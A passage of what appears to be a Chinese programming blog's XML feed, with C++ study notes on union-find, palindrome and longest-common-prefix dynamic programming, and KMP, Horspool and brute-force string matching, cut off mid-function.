<h5 id="1368-使网格图至少有一条有效路径的最小代价"><a href="https://leetcode.cn/problems/minimum-cost-to-make-at-least-one-valid-path-in-a-grid/">1368. 使网格图至少有一条有效路径的最小代价</a></h5>
</li>
<li class="lvl-2">
<h5 id="1514-概率最大的路径"><a href="https://leetcode.cn/problems/path-with-maximum-probability/">1514. 概率最大的路径</a></h5>
</li>
</ul>
]]></content>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2023/10/25/%E7%AE%97%E6%B3%95/%E5%B9%B6%E6%9F%A5%E9%9B%86(union-find,%20disjoint%20set)/</url>
    <content><![CDATA[<h1>1 简洁写法</h1>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UnionFind</span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; id;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">UnionFind</span>(<span class="type">int</span> n):<span class="built_in">id</span>(n)&#123;</span><br><span class="line">        <span class="built_in">iota</span>(id.<span class="built_in">begin</span>(),id.<span class="built_in">end</span>(),<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 找到p的父节点</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(p!=id[p])</span><br><span class="line">            p=id[p];</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在p和q之间添加边</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> q)</span></span>&#123;</span><br><span class="line">        id[<span class="built_in">find</span>(p)]=<span class="built_in">find</span>(q);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// p和q是否同属于一个集合</span></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isConnect</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> q)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">find</span>(p)==<span class="built_in">find</span>(q);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>2 路径压缩+按秩合并</h1>
<p><a href="https://leetcode.cn/problems/number-of-operations-to-make-network-connected/solutions/101780/lian-tong-wang-luo-de-cao-zuo-ci-shu-by-leetcode-s/">1319. 连通网络的操作次数 - 力扣（LeetCode）</a>（模板，更清晰）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UnionFind</span> &#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; id, size;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//把数组初始化为0到n-1</span></span><br><span class="line">    <span class="built_in">UnionFind</span>(<span class="type">int</span> n) : <span class="built_in">id</span>(n), <span class="built_in">size</span>(n, <span class="number">1</span>) &#123; <span class="built_in">iota</span>(id.<span class="built_in">begin</span>(), id.<span class="built_in">end</span>(), <span class="number">0</span>); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 路径压缩</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// p的父节点</span></span><br><span class="line">        <span class="keyword">while</span> (id[p] != p) &#123;</span><br><span class="line">            id[p] = id[id[p]];</span><br><span class="line">            p = id[p];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">connect</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="built_in">find</span>(p), j = <span class="built_in">find</span>(q);</span><br><span class="line">        <span class="keyword">if</span> (i != j) &#123;</span><br><span class="line">            <span class="comment">// 按秩合并，把元素数少的集合合并到元素数多的集合</span></span><br><span class="line">            <span class="keyword">if</span> (size[i] &gt; size[j]) &#123;</span><br><span class="line">                id[j] = i;</span><br><span class="line">                size[i] += size[j];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                id[i] = j;</span><br><span class="line">                size[j] += size[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isConnect</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">find</span>(p) == <span class="built_in">find</span>(q); &#125;</span><br><span class="line">    <span class="comment">// 返回由多少个独立的集合</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getCnt</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; id.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (id[i] == i)</span><br><span class="line">                cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h1>3 删除边</h1>
<p><a href="https://zhuanlan.zhihu.com/p/582511962">并查集优化——树上删除操作 - 知乎 (zhihu.com)</a><br>
<a href="https://www.cnblogs.com/wingman/p/10387069.html">并查集-并查集的删除操作 - 僚机 - 博客园 (cnblogs.com)</a><br>
<a href="https://blog.csdn.net/qq_41694395/article/details/79253047">并查集——简单易懂（内附并查集删除操作）_可删并查集-CSDN博客</a></p>
]]></content>
  </entry>
  <entry>
    <title>字符串相关算法</title>
    <url>/2023/02/28/%E7%AE%97%E6%B3%95/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9B%B8%E5%85%B3%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1>1 字符串相关算法</h1>
<h2 id="1-1-回文串">1.1 回文串</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202305151158271.png" alt="image-20221029165353877"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s;</span><br><span class="line"><span class="type">int</span> n=s.<span class="built_in">size</span>();</span><br><span class="line"><span class="comment">//f[i][j]表示s[i:j]是否是回文串</span></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">f</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n,<span class="literal">true</span>));</span><br><span class="line"></span><br><span class="line">s=<span class="string">&quot;abbab&quot;</span></span><br><span class="line"><span class="comment">//从前向后处理，错误</span></span><br><span class="line"><span class="comment">//f[1][4]=(s[1]==s[4])&amp;&amp;f[2][3]</span></span><br><span class="line"><span class="comment">//f[1][4]需要用到f[2][3]，而f[2][3]还未处理</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    for(int i=0;i&lt;n;i++)&#123;</span></span><br><span class="line"><span class="comment">        for(int j=i+1;j&lt;n;j++)</span></span><br><span class="line"><span class="comment">            f[i][j]=(s[i]==s[j])&amp;&amp;f[i+1][j-1]; </span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//从后向前处理</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=i<span class="number">+1</span>;j&lt;n;j++)</span><br><span class="line">        f[i][j]=(s[i]==s[j])&amp;&amp;f[i<span class="number">+1</span>][j<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-2-LCP（最长公共前缀）">1.2 LCP（最长公共前缀）</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// f[i][j]表示s[i:]和s[j:]的最长公共前缀数量</span></span><br><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">f</span>(n<span class="number">+1</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n<span class="number">+1</span>,<span class="number">0</span>));</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=n<span class="number">-1</span>;j&gt;i;j--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==s[j])</span><br><span class="line">            f[i][j]=f[i<span class="number">+1</span>][j<span class="number">+1</span>]<span class="number">+1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>2 字符串匹配算法</h1>
<blockquote>
<p>从文本中寻找模式串的匹配算法，蛮力算法及KMP算法</p>
</blockquote>
<h2 id="2-1-逐字符匹配">2.1 逐字符匹配</h2>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/20210816200255.png" alt="image-20210816200255814"></p>
<blockquote>
<p>文本长度（T）：m</p>
<p>模式串长度（P）：n</p>
<p>下标从1开始，i为T的下标，j为P的下标</p>
<p>i 的下标范围为[1,m-n+1]，之后的长度小于n，肯定无法与模式串匹配</p>
</blockquote>
<p>查找过程：T从某一下标i开始，P从1开始，T依次与P的相应位置匹配，如果不匹配，则回退到位置i+1，同时P的下标也回退到开始</p>
<h2 id="2-2-KMP算法">2.2 KMP算法</h2>
<p>串的前缀：除最后一个字符以外，字符串的所有头部子串 （ $aba前缀{a,ab}$）</p>
<p>串的后缀：除第一个字符以外，字符串的所有尾部子串（ $aba前缀{a,ba}$）</p>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/202108192113896.png" alt="image-20210819211339841" style="zoom: 67%;" />
<blockquote>
<p>当文本串的第i个字符与模式串的第k个字符不匹配时，对于图中的情况，在第k个字符前存在相等的前缀和后缀时，可以将字符移动，用模式串的第t个字符与文本串的第i个字符继续进行比较，</p>
<p>因此，需要知道在Pattern第k个字符失配时，需要用哪个字符继续与Text第i个字符比较</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/%E7%AE%97%E6%B3%95%E5%9B%BE%E7%A4%BA.jpg" alt="算法图示"></p>
<h3 id="2-2-1-求next-j-：">2.2.1 求next(j)：</h3>
<blockquote>
<p>第j个字符前，使前缀串=后缀串的最大值为k</p>
<p>则next[j]=k+1</p>
</blockquote>
<p>$$<br>
\begin{equation}<br>
next[j]=</p>
<p>\begin{cases}<br>
0&amp; \text{j=1}\<br>
max{k,1&lt;k&lt;j且’p_1…p_k’=‘p_{j-k+1}…p_{j-1}’}&amp; \text{此集合不空时}\<br>
1&amp; \text{其他情况}</p>
<p>\end{cases}</p>
<p>\end{equation}<br>
$$</p>
<blockquote>
<p>规定next[1]为0，当第1个字符就不匹配时，用第0个字符用Text[i]比较，相当于在Pattern前添加一个空字符</p>
<p>P[1]!=T[j]时，用P[0]与T[j]比较</p>
<p>即P[1]与T[j+1]比较</p>
</blockquote>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/202108192134856.png" alt="image-20210819213443818" style="zoom:67%;" />
### 求next程序
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_Next</span><span class="params">(string &amp;P, vector&lt;<span class="type">int</span>&gt; &amp;next)</span> </span>&#123;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; P.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || P[j - <span class="number">1</span>] == P[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            j = next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>j处于Patter前部，当next[i]=next[j]时</p>
<p>说明i+1前的前缀串=后缀串的长度为j，</p>
<p>则next[i+1]=j+1</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic/202108192152260.png" alt="image-20210819215203223"></p>
<blockquote>
<p>next(j)产生过程：</p>
</blockquote>
<table>
<thead>
<tr>
<th>j</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
</tr>
</thead>
<tbody>
<tr>
<td>模式串</td>
<td>a</td>
<td>b</td>
<td>a</td>
<td>a</td>
<td>b</td>
<td>c</td>
<td>a</td>
<td>c</td>
</tr>
<tr>
<td>next[j]</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>2</td>
<td>3</td>
<td>1</td>
<td>2</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th>j=0</th>
<th>i=1</th>
<th></th>
<th>=&gt;</th>
<th>j=1</th>
<th>i=2</th>
<th>next[2]=1</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td>p[1] != p[2]</td>
<td>=&gt;</td>
<td></td>
<td></td>
<td>j=next[1]=0</td>
</tr>
<tr>
<td>j=0</td>
<td>i=2</td>
<td></td>
<td>=&gt;</td>
<td>j=1</td>
<td>i=3</td>
<td>next[3]=1</td>
</tr>
<tr>
<td></td>
<td></td>
<td>p[1] = p[3]</td>
<td>=&gt;</td>
<td>j=2</td>
<td>i=4</td>
<td>next[4]=2</td>
</tr>
<tr>
<td></td>
<td></td>
<td>p[2] !=p[4]</td>
<td>=&gt;</td>
<td></td>
<td></td>
<td>j=next[2]=1</td>
</tr>
<tr>
<td></td>
<td></td>
<td>p[1] = p[4]</td>
<td>=&gt;</td>
<td>j=2</td>
<td>i=5</td>
<td>next[5]=2</td>
</tr>
<tr>
<td></td>
<td></td>
<td>p[2] = p[5]</td>
<td>=&gt;</td>
<td>j=3</td>
<td>i=6</td>
<td>next[6]=3</td>
</tr>
</tbody>
</table>
<h3 id="2-2-2-KMP模板">2.2.2 KMP模板</h3>
<p><a href="https://www.zhihu.com/question/21923021/answer/37475572">(99+ 封私信 / 84 条消息) 如何更好地理解和掌握 KMP 算法? - 知乎 (zhihu.com)</a></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回s中t出现多少次</span></span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">KMP</span><span class="params">(string s, string t)</span> </span>&#123;</span><br><span class="line">      vector&lt;<span class="type">int</span>&gt; next = <span class="built_in">getNext</span>(t);</span><br><span class="line">      <span class="comment">// 匹配t数目，当前匹配的字符数</span></span><br><span class="line">      <span class="type">int</span> match = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//第count个字符没有匹配上，则取可以匹配的最长前缀长度k，其中[0,k-1]可以匹配上</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">          <span class="keyword">while</span> (count &amp;&amp; t[count] != s[i])</span><br><span class="line">              count = next[count - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (t[count] == s[i])</span><br><span class="line">              count++;</span><br><span class="line">          <span class="keyword">if</span> (count == t.<span class="built_in">size</span>()) &#123;</span><br><span class="line">              match++;</span><br><span class="line">              count = next[count - <span class="number">1</span>];</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> match;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//next[i]前后缀相等的最大长度</span></span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">getNext</span><span class="params">(string pattern)</span> </span>&#123;</span><br><span class="line">      <span class="type">int</span> n = pattern.<span class="built_in">size</span>();</span><br><span class="line">      <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">next</span><span class="params">(n)</span></span>;</span><br><span class="line">      <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">          <span class="keyword">while</span> (count &amp;&amp; pattern[count] != pattern[i])</span><br><span class="line">              count = next[count - <span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> (pattern[count] == pattern[i])</span><br><span class="line">              ++count;</span><br><span class="line">          next[i] = count;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> next;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-3-Horspool算法">2.3 Horspool算法</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShiftTable</span><span class="params">(string &amp;P, unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; &amp;table)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//范围不到最后一个字符</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; P.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        table[P[i]] = P.<span class="built_in">size</span>() - i - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// cout &lt;&lt; P[i] &lt;&lt; &quot; &quot; &lt;&lt; table[P[i]] &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Horspool</span><span class="params">(string &amp;T, string &amp;P)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; table;</span><br><span class="line">    <span class="built_in">ShiftTable</span>(P, table);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n = T.<span class="built_in">size</span>(), m = P.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> i = m - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">        <span class="type">int</span> k = <span class="number">0</span>; <span class="comment">//已经匹配的字符数</span></span><br><span class="line">        <span class="keyword">while</span> (P[m - <span class="number">1</span> - k] == T[i - k] &amp;&amp; k &lt; m) &#123;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k == m)</span><br><span class="line">            <span class="keyword">return</span> i - m + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// T[i]是与模式不匹配的字符</span></span><br><span class="line">        <span class="comment">//如果其不在模式中时，则模式与其下一个位置匹配</span></span><br><span class="line">        <span class="comment">//如果在模式中时，移动模式使最右侧的该字符与T[i]对齐</span></span><br><span class="line">        <span class="keyword">if</span> (table.<span class="built_in">find</span>(T[i]) == table.<span class="built_in">end</span>())</span><br><span class="line">            i = i + m;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            i = i + table[T[i]];</span><br><span class="line">        <span class="comment">// cout &lt;&lt; i &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-4-Boyer-Moore算法">2.4 Boyer-Moore算法</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    字符串匹配算法</span></span><br><span class="line"><span class="comment">    T:text文本</span></span><br><span class="line"><span class="comment">    P:pattern模式串</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回下标从0开始计数的位置</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BruteForceStringMatch</span><span class="params">(string t, string p)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = t.<span class="built_in">size</span>(), m = p.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n - m; i++) &#123;</span><br><span class="line">        <span class="type">int</span> k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; m &amp;&amp; t[k + i] == p[k])</span><br><span class="line">            k++;</span><br><span class="line">        <span class="keyword">if</span> (k == m)</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    返回从pos位置开始第一个与P匹配的首字符位置</span></span><br><span class="line"><span class="comment">    这里j为1表示字符串第一个字符</span></span><br><span class="line"><span class="comment">    j=0表示P的第一个字母与T的当前字母不匹配</span></span><br><span class="line"><span class="comment">    查找位置pos为下标序，从0开始</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_Next</span><span class="params">(string &amp;P, vector&lt;<span class="type">int</span>&gt; &amp;next)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">KMP</span><span class="params">(string T, string P, <span class="type">int</span> pos)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n = T.<span class="built_in">size</span>(), m = P.<span class="built_in">size</span>();</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">next</span><span class="params">(m + <span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="built_in">get_Next</span>(P, next);</span><br><span class="line">    <span class="type">int</span> i = pos, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= n &amp;&amp; j &lt;= m) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || T[i - <span class="number">1</span>] == P[j - <span class="number">1</span>]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (j &gt; m)</span><br><span class="line">        <span class="keyword">return</span> i - j;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_Next</span><span class="params">(string &amp;P, vector&lt;<span class="type">int</span>&gt; &amp;next)</span> </span>&#123;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; P.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">0</span> || P[j - <span class="number">1</span>] == P[i - <span class="number">1</span>]) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">            next[i] = j;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            j = next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ShiftTable</span><span class="params">(string &amp;P, unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; &amp;table)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//范围不到最后一个字符</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; P.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        table[P[i]] = P.<span class="built_in">size</span>() - i - <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// cout &lt;&lt; P[i] &lt;&lt; &quot; &quot; &lt;&lt; table[P[i]] &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Horspool</span><span class="params">(string &amp;T, string &amp;P)</span> </span>&#123;</span><br><span class="line">    unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; table;</span><br><span class="line">    <span class="built_in">ShiftTable</span>(P, table);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n = T.<span class="built_in">size</span>(), m = P.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> i = m - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; n) &#123;</span><br><span class="line">        <span class="type">int</span> k = <span class="number">0</span>; <span class="comment">//已经匹配的字符数</span></span><br><span class="line">        <span class="keyword">while</span> (P[m - <span class="number">1</span> - k] == T[i - k] &amp;&amp; k &lt; m) &#123;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k == m)</span><br><span class="line">            <span class="keyword">return</span> i - m + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// T[i]是与模式不匹配的字符</span></span><br><span class="line">        <span class="comment">//如果其不在模式中时，则模式与其下一个位置匹配</span></span><br><span class="line">        <span class="comment">//如果在模式中时，移动模式使最右侧的该字符与T[i]对齐</span></span><br><span class="line">        <span class="keyword">if</span> (table.<span class="built_in">find</span>(T[i]) == table.<span class="built_in">end</span>())</span><br><span class="line">            i = i + m;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            i = i + table[T[i]];</span><br><span class="line">        <span class="comment">// cout &lt;&lt; i &lt;&lt; endl;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    string text = <span class="string">&quot;acabaabaabcacaabc&quot;</span>, pattern = <span class="string">&quot;abaabc&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">BruteForceStringMatch</span>(text, pattern) &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">KMP</span>(text, pattern, <span class="number">3</span>) &lt;&lt; endl;</span><br><span class="line">    string P = <span class="string">&quot;BARBER&quot;</span>, T = <span class="string">&quot;JIM_SAW_ME_IN_A_BARBERSHOP&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">Horspool</span>(T, P) &lt;&lt; endl;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-5-题目">2.5 题目</h2>
<h4 id="28-找出字符串中第一个匹配项的下标"><a href="https://leetcode.cn/problems/find-the-index-of-the-first-occurrence-in-a-string/">28. 找出字符串中第一个匹配项的下标</a></h4>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">strStr</span><span class="params">(string haystack, string needle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">KMP</span>(haystack,needle);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">KMP</span><span class="params">(string &amp;s,string &amp;p)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> m=s.<span class="built_in">size</span>(),n=p.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">next</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="built_in">getNext</span>(next,p);</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;m&amp;&amp;j&lt;n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">-1</span>||s[i]==p[j])&#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                j=next[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> j==n?i-j:<span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">getNext</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp;next,string &amp;p)</span></span>&#123;</span><br><span class="line">        next[<span class="number">0</span>]=<span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> i=<span class="number">-1</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;p.<span class="built_in">size</span>()<span class="number">-1</span>)&#123;</span><br><span class="line">            